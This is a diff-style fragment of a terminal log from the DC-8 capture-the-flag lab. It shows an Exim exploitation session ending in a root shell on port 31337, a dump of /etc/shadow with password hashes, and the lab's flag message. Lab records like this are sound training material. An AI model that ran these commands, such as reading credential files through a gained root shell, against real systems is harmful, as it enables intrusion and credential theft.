+250 OK id=1ljWSW-0000wD-Eh
+221 dc-8 closing connection
+
+Waiting 5 seconds...
+localhost [127.0.0.1] 31337 (?) open
+id
+uid=0(root) gid=113(Debian-exim) groups=113(Debian-exim)
+
+
+cat /etc/shadow
+root:$6$hpnGzStq$WhB2YFhPJ/4EIda9Rz1Ud/YTyjw3WC0aQbFCjDr.6GqzPHYn8iaAoUJBZ/EtURd6GCTntjIITj4dEuvKTHb2F1:18143:0:99999:7:::
+daemon:*:18143:0:99999:7:::
+bin:*:18143:0:99999:7:::
+sys:*:18143:0:99999:7:::
+sync:*:18143:0:99999:7:::
+games:*:18143:0:99999:7:::
+man:*:18143:0:99999:7:::
+lp:*:18143:0:99999:7:::
+mail:*:18143:0:99999:7:::
+news:*:18143:0:99999:7:::
+uucp:*:18143:0:99999:7:::
+proxy:*:18143:0:99999:7:::
+www-data:*:18143:0:99999:7:::
+backup:*:18143:0:99999:7:::
+list:*:18143:0:99999:7:::
+irc:*:18143:0:99999:7:::
+gnats:*:18143:0:99999:7:::
+nobody:*:18143:0:99999:7:::
+systemd-timesync:*:18143:0:99999:7:::
+systemd-network:*:18143:0:99999:7:::
+systemd-resolve:*:18143:0:99999:7:::
+systemd-bus-proxy:*:18143:0:99999:7:::
+_apt:*:18143:0:99999:7:::
+messagebus:*:18143:0:99999:7:::
+sshd:*:18143:0:99999:7:::
+dc8user:$6$WcokQy.1$zuDayNe3rXOOiXlnxUF6vLnJE0GMLHsFkmjSVRkibLS.FQEB52biDTgaKpxQX2rwNnS6OQwVbuWYnEeh7ieii0:18143:0:99999:7:::
+mysql:!:18143:0:99999:7:::
+Debian-exim:!:18143:0:99999:7:::
+
+
+cd /root
+ls -l
+total 4
+-rw-r--r-- 1 root root 1320 Sep  6  2019 flag.txt
+
+
+cat flag.txt
+
+
+
+
+Brilliant - you have succeeded!!!
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888
+888   o   888          888 888      888  "Y88b                            888 888 888 888
+888  d8b  888          888 888      888    888                            888 888 888 888
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
+888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
+888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888
+
+
+
+Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and all those who have taken the time to complete these little
+challenges.
+
+I'm also sending out an especially big thanks to:
+
+@4nqr34z
+@D4mianWayne
+@0xmzfr
+@theart42
+
+This challenge was largely based on two things:
+
+1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
+2. A suggestion from @theart42
+
+The answer to that question is...
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
+www-data@dc-8:/tmp$ 
+
